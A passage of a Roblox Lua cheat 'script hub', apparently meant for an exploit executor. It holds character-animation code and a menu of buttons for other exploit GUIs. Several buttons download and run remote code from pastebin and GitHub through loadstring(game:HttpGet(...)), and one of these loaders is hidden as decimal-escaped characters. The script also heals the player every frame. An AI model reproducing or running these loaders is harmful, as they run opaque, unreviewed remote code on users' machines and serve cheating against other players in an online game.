			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(35)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(-25), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.15, 0.5, -0.5) * ANGLES(RAD(90), RAD(0), RAD(-35)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(110), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-65), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
	end
	HIT:disconnect()
	ATTACK = false
	Rooted = false
	PLAYANIMS = true
end

function Taunt()
	ATTACK = true
	Rooted = true
	PLAYANIMS = false
	CreateSound(159882303,Torso,5,MRANDOM(8,9)/10,false)
	for i=0, 1.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(35), RAD(0)), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(140)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-140)) * ANGLES(RAD(0), RAD(90), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
	end
	PLAYANIMS = true
	ATTACK = false
	Rooted = false
end

--//=================================\\
--||	  ASSIGN THINGS TO KEYS
--\\=================================//

function MouseDown(Mouse)
	HOLD = true
	if ATTACK == false then
		Attack()
	end
end

function MouseUp(Mouse)
HOLD = false
end

function KeyDown(Key)
	KEYHOLD = true
	if Key == "z" and ATTACK == false then
		if CLOAKED == false then
			Cloaked()
		else
			CLOAKED = false
		end
	end

	if Key == "t" and ATTACK == false then
		Taunt()
	end

	if string.byte(Key) == 50 and ATTACK == false and CLOAKED == false then
		if Speed == 12 then
			Speed = 30
		elseif Speed == 30 then
			Speed = 12
		end
	end
end

function KeyUp(Key)
	KEYHOLD = false
end

	Mouse.Button1Down:connect(function(NEWKEY)
		MouseDown(NEWKEY)
	end)
	Mouse.Button1Up:connect(function(NEWKEY)
		MouseUp(NEWKEY)
	end)
	Mouse.KeyDown:connect(function(NEWKEY)
		KeyDown(NEWKEY)
	end)
	Mouse.KeyUp:connect(function(NEWKEY)
		KeyUp(NEWKEY)
	end)

--//=================================\\
--\\=================================//

function unanchor()
	if UNANCHOR == true then
		g = Character:GetChildren()
		for i = 1, #g do
			if g[i].ClassName == "Part" then
				g[i].Anchored = false
			end
		end
	end
end

--//=================================\\
--||	WRAP THE WHOLE SCRIPT UP
--\\=================================//

Humanoid.Changed:connect(function(Jump)
	if Jump == "Jump" and (Disable_Jump == true) then
		Humanoid.Jump = false
	end
end)

while true do
	Swait()
	script.Parent = WEAPONGUI
	ANIMATE.Parent = nil
	for _,v in next, Humanoid:GetPlayingAnimationTracks() do
	    v:Stop();
	end
	SINE = SINE + CHANGE
	local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
	local TORSOVERTICALVELOCITY = RootPart.Velocity.y
	local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
	local WALKSPEEDVALUE = 6 / (Humanoid.WalkSpeed / 16)
	if ANIM == "Walk" and TORSOVELOCITY > 1 then
		RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, -0.15 * COS(SINE / (WALKSPEEDVALUE / 2))) * ANGLES(RAD(0), RAD(0) - RootPart.RotVelocity.Y / 75, RAD(0)), 2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(2.5 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0) - Head.RotVelocity.Y / 30), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 0.875 - 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0) - RightLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.3 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 0.875 + 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), 0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0) + LeftLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.3 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
	elseif (ANIM ~= "Walk") or (TORSOVELOCITY < 1) then
		RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
	end
	if TORSOVERTICALVELOCITY > 1 and HITFLOOR == nil then
		ANIM = "Jump"
		if PLAYANIMS == true then
			RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(20)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(-20)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, -0.3) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(-20)), 0.2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(20)), 0.2 / Animation_Speed)
	    end
	elseif TORSOVERTICALVELOCITY < -1 and HITFLOOR == nil then
		ANIM = "Fall"
		if PLAYANIMS == true then
			RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 ) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0 , 0 + ((1) - 1)) * ANGLES(RAD(20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(60)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-60)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(20)), 0.2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(10)), 0.2 / Animation_Speed)
		end
	elseif TORSOVELOCITY < 1 and HITFLOOR ~= nil then
		ANIM = "Idle"
		if PLAYANIMS == true then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(15), RAD(35), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
	elseif TORSOVELOCITY > 1 and HITFLOOR ~= nil then
		ANIM = "Walk"
		if PLAYANIMS == true then
			if Humanoid.WalkSpeed <= 17 then
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 0.35 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
			else
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(35), RAD(0), RAD(5 * SIN(SINE / (WALKSPEEDVALUE / 2)))), 0.15 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-25 - 1 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(-5 * SIN(SINE / (WALKSPEEDVALUE / 2)))), 0.15 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, -0.2) * ANGLES(RAD(0), RAD(35), RAD(0)) * ANGLES(RAD(35+20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.2) * ANGLES(RAD(0), RAD(-35), RAD(0)) * ANGLES(RAD(35-60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 1 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5)), 2 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5)), 2 / Animation_Speed)
			end
		end
	end
	unanchor()
	if Rooted == false then
		Disable_Jump = false
		Humanoid.WalkSpeed = Speed
	elseif Rooted == true then
		Disable_Jump = true
		Humanoid.WalkSpeed = 0
	end
	if Head:FindFirstChild("face") then
		Head.face:remove()
	elseif Head:FindFirstChildOfClass("Sound") then
		Head:FindFirstChildOfClass("Sound"):remove()
	end
	Humanoid.Health = Humanoid.Health + 1
end

--//=================================\\
--\\=================================//





--//====================================================\\--
--||			  		 END OF SCRIPT
--\\====================================================//--
end)
TextButton_6.Parent = Main
TextButton_6.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_6.BorderSizePixel = 3
TextButton_6.Position = UDim2.new(0.0308483411, 0, 0.429824591, 0)
TextButton_6.Size = UDim2.new(0, 113, 0, 32)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Custom Hitbox"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
TextButton_6.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\84\117\76\56\53\57\57\77\39\41\41\40\41\10")()
end)
TextButton_7.Parent = Main
TextButton_7.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_7.BorderSizePixel = 5
TextButton_7.Position = UDim2.new(0.0308483411, 0, 0.661519587, 0)
TextButton_7.Size = UDim2.new(0, 365, 0, 32)
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "Invisible GUI"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
TextButton_7.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
end)
TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 174, 245)
TextLabel_2.BorderColor3 = Color3.fromRGB(64, 101, 127)
TextLabel_2.BorderSizePixel = 2
TextLabel_2.Position = UDim2.new(0, 0, 0.851239681, 0)
TextLabel_2.Size = UDim2.new(0, 389, 0, 36)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Made by ItzzJoshua_ credits to the owner of these scripts"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 36.000
TextLabel_2.TextStrokeColor3 = Color3.fromRGB(147, 60, 171)
TextLabel_2.TextWrapped = true
end)

Section:NewButton("RemX Gui", "Old. But Op", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/Henry887/RemX-Script-Hub/main/main.lua'),true))()
end)

Section:NewButton("Heart Ui", "Old But Op", function()
   loadstring(game:GetObjects("rbxassetid://1313915586")[1].Source)()
end)

Section:NewButton("TopK3K Gui", "Old but Op", function()
-- loadstring(game:HttpGet(""))()

--{ Instances: }--

local TKR = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Topbar = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local Controllers = Instance.new("Frame")
local Hide = Instance.new("TextButton")
local DisabledLabel = Instance.new("TextLabel")
local Holder = Instance.new("Frame")
local Home = Instance.new("Frame")
local Welcome = Instance.new("TextLabel")
local Container = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local TextLabel_7 = Instance.new("TextLabel")
local TextLabel_8 = Instance.new("TextLabel")
local TextLabel_9 = Instance.new("TextLabel")
local TextLabel_10 = Instance.new("TextLabel")
local TextLabel_11 = Instance.new("TextLabel")
local Scripts = Instance.new("Frame")
local Container_3 = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
local Script = Instance.new("TextButton")
local Script_2 = Instance.new("TextButton")
local Script_3 = Instance.new("TextButton")
local Script_4 = Instance.new("TextButton")
local Script_5 = Instance.new("TextButton")
local Script_6 = Instance.new("TextButton")
local Script_7 = Instance.new("TextButton")
local Script_8 = Instance.new("TextButton")
local Script_9 = Instance.new("TextButton")
local Script_10 = Instance.new("TextButton")
local Script_11 = Instance.new("TextButton")
local Script_12 = Instance.new("TextButton")
local Script_13 = Instance.new("TextButton")
local Script_14 = Instance.new("TextButton")
local Script_15 = Instance.new("TextButton")
local Script_16 = Instance.new("TextButton")
local Script_17 = Instance.new("TextButton")
local Script_18 = Instance.new("TextButton")
local Info = Instance.new("Frame")
local Container_4 = Instance.new("ScrollingFrame")
local TextLabel_12 = Instance.new("TextLabel")
local Settings = Instance.new("Frame")
local Container_5 = Instance.new("ScrollingFrame")
local TextLabel_13 = Instance.new("TextLabel")
local TextLabel_14 = Instance.new("TextLabel")
local TextLabel_15 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local Navigation = Instance.new("Frame")
local Topbar_2 = Instance.new("Frame")
local Scroll = Instance.new("ScrollingFrame")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_29 = Instance.new("TextButton")
local TextBox_2 = Instance.new("TextBox")
local TextBox_3 = Instance.new("TextBox")
local TextBox_4 = Instance.new("TextBox")
local DisabledCommand = Instance.new("TextBox")
local Label = Instance.new("TextLabel")

--{ Properties: }--

TKR.Name = "TKR"
TKR.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
TKR.ResetOnSpawn = false

---> Property of aWx5 <---


local lpr = game.Players.LocalPlayer

--{ Text Stuff: }--

local name = game.Players.LocalPlayer.DisplayName
local place = game.PlaceId
local ping = "-"
local filteringenabled = game.Workspace.FilteringEnabled

--{ Topbar Buttons: }--

local exitdirectory = game.Players.LocalPlayer.PlayerGui.TKR
local closed = UDim2.new(0, 470,0, 30)
local winState = 0


Main.Name = "Main"
Main.Parent = TKR
Main.Active = true
Main.BackgroundColor3 = Color3.fromRGB(32, 66, 190)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Draggable = true
Main.Position = UDim2.new(0, 418, 0, 40)
Main.Selectable = true
Main.Size = UDim2.new(0, 470, 0, 395)

Topbar.Name = "Topbar"
Topbar.Parent = Main
Topbar.BackgroundColor3 = Color3.fromRGB(60, 119, 191)
Topbar.BorderSizePixel = 0
Topbar.Position = UDim2.new(0, 150, 0, 0)
Topbar.Size = UDim2.new(0, 320, 0, 30)

Controllers.Name = "Controllers"
Controllers.Parent = Topbar
Controllers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Controllers.BackgroundTransparency = 1.000
Controllers.Position = UDim2.new(1, -128, 0, 3)
Controllers.Size = UDim2.new(0, 125, 1, -6)

Exit.Name = "Exit"
Exit.Parent = Controllers
Exit.BackgroundColor3 = Color3.fromRGB(141, 27, 27)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(1, -24, 0, 0)
Exit.Size = UDim2.new(0, 24, 0, 24)
Exit.AutoButtonColor = false
Exit.Font = Enum.Font.SourceSans
Exit.Text = ""
Exit.TextSize = 14.000
Exit.MouseButton1Click:Connect(function()
	exitdirectory:Destroy()
end)

Hide.Name = "Hide"
Hide.Parent = Controllers
Hide.BackgroundColor3 = Color3.fromRGB(199, 89, 0)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(1, -50, 0, 0)
Hide.Size = UDim2.new(0, 24, 0, 24)
Hide.AutoButtonColor = false
Hide.Font = Enum.Font.SourceSans
Hide.Text = ""
Hide.TextSize = 14.000
Hide.MouseButton1Click:Connect(function()
	if winState == 0 then
		winState = 1
		Main:TweenSize(UDim2.new(0, 470, 0, 30), 'Out', 'Quad', 0.3, true)
	else
		winState = 0
		Main:TweenSize(UDim2.new(0, 470, 0, 395), 'In', 'Quad', 0.3, true)
	end
	
end)

DisabledLabel.Name = "DisabledLabel"
DisabledLabel.Parent = Controllers
DisabledLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DisabledLabel.BackgroundTransparency = 1.000
DisabledLabel.Size = UDim2.new(0, 65, 1, 0)
DisabledLabel.Visible = false
DisabledLabel.Font = Enum.Font.SourceSans
DisabledLabel.Text = ""
DisabledLabel.TextColor3 = Color3.fromRGB(13, 105, 172)
DisabledLabel.TextSize = 16.000
DisabledLabel.TextStrokeTransparency = 0.700
DisabledLabel.TextXAlignment = Enum.TextXAlignment.Right

Holder.Name = "Holder"
Holder.Parent = Main
Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Holder.BackgroundTransparency = 1.000
Holder.Position = UDim2.new(0, 150, 0, 30)
Holder.Size = UDim2.new(0, 320, 0, 365)

Home.Name = "Home"
Home.Parent = Holder
Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home.BackgroundTransparency = 1.000
Home.Size = UDim2.new(1, 0, 1, 0)

Welcome.Name = "Welcome"
Welcome.Parent = Home
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.BackgroundTransparency = 1.000
Welcome.BorderSizePixel = 0
Welcome.Position = UDim2.new(0, 15, 0, 0)
Welcome.Selectable = true
Welcome.Size = UDim2.new(1, -30, 0, 40)
Welcome.Font = Enum.Font.SourceSansBold
Welcome.Text = "Welcome, "..tostring(name)
Welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
Welcome.TextSize = 34.000
Welcome.TextStrokeTransparency = 0.500
Welcome.TextXAlignment = Enum.TextXAlignment.Left

Container.Name = "Container"
Container.Parent = Home
Container.BackgroundColor3 = Color3.fromRGB(32, 66, 190)
Container.BorderColor3 = Color3.fromRGB(45, 72, 200)
Container.Position = UDim2.new(0, 15, 0, 41)
Container.Size = UDim2.new(1, -30, 0.145205483, 250)

TextLabel.Parent = Container
TextLabel.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 6, 0, 6)
TextLabel.Size = UDim2.new(1, -12, 0, 20)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "T0PK3K REMAKE FE EDITION"
TextLabel.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Container
TextLabel_2.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 6, 0, 29)
TextLabel_2.Size = UDim2.new(1, -12, 0, 20)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Patch version 1.0"
TextLabel_2.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_2.TextSize = 14.000

TextLabel_3.Parent = Container
TextLabel_3.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0, 6, 0, 270)
TextLabel_3.Size = UDim2.new(1, -12, 0, 20)
TextLabel_3.Visible = false
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = ""
TextLabel_3.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_3.TextSize = 14.000

TextLabel_4.Parent = Container
TextLabel_4.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0, 6, 0, 53)
TextLabel_4.Size = UDim2.new(1, -12, 0, 20)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_4.TextSize = 14.000

TextLabel_5.Parent = Container
TextLabel_5.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0, 6, 0, 75)
TextLabel_5.Size = UDim2.new(1, -12, 0, 20)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Server Size: "
TextLabel_5.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_5.TextSize = 14.000

TextLabel_6.Parent = Container
TextLabel_6.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0, 6, 0, 98)
TextLabel_6.Size = UDim2.new(1, -12, 0, 20)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "FilteringEnabled: "..tostring(filteringenabled)
TextLabel_6.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_6.TextSize = 14.000

TextLabel_7.Parent = Container
TextLabel_7.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_7.BorderSizePixel = 0
TextLabel_7.Position = UDim2.new(0, 6, 0, 124)
TextLabel_7.Size = UDim2.new(1, -12, 0, 20)
TextLabel_7.Font = Enum.Font.SourceSans
TextLabel_7.Text = "PlaceId: "..tostring(place)
TextLabel_7.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_7.TextSize = 14.000

TextLabel_8.Parent = Container
TextLabel_8.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_8.BorderSizePixel = 0
TextLabel_8.Position = UDim2.new(0, 6, 0, 150)
TextLabel_8.Size = UDim2.new(1, -12, 0, 20)
TextLabel_8.Font = Enum.Font.SourceSans
TextLabel_8.Text = "FPS: "
TextLabel_8.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_8.TextSize = 14.000

TextLabel_9.Parent = Container
TextLabel_9.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_9.BorderSizePixel = 0
TextLabel_9.Position = UDim2.new(0, 6, 0, 176)
TextLabel_9.Size = UDim2.new(1, -12, 0, 20)
TextLabel_9.Font = Enum.Font.SourceSans
TextLabel_9.Text = ": "..tostring(ping)
TextLabel_9.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_9.TextSize = 14.000

TextLabel_10.Parent = Container
TextLabel_10.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_10.BorderSizePixel = 0
TextLabel_10.Position = UDim2.new(0, 6, 0, 203)
TextLabel_10.Size = UDim2.new(1, -12, 0, 20)
TextLabel_10.Font = Enum.Font.SourceSans
TextLabel_10.Text = "Join our discord! discord.gg/z6Ggtqh5W8"
TextLabel_10.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_10.TextSize = 14.000

TextLabel_11.Parent = Container
TextLabel_11.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_11.BorderSizePixel = 0
TextLabel_11.Position = UDim2.new(0, 6, 0, 242)
TextLabel_11.Size = UDim2.new(1, -12, 0, 20)
TextLabel_11.Visible = false
TextLabel_11.Font = Enum.Font.SourceSans
TextLabel_11.Text = ""
TextLabel_11.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_11.TextSize = 14.000

Scripts.Name = "Scripts"
Scripts.Parent = Holder
Scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scripts.BackgroundTransparency = 1.000
Scripts.Size = UDim2.new(1, 0, 1, 0)
Scripts.Visible = false

Container_3.Name = "Container"
Container_3.Parent = Scripts
Container_3.Active = true
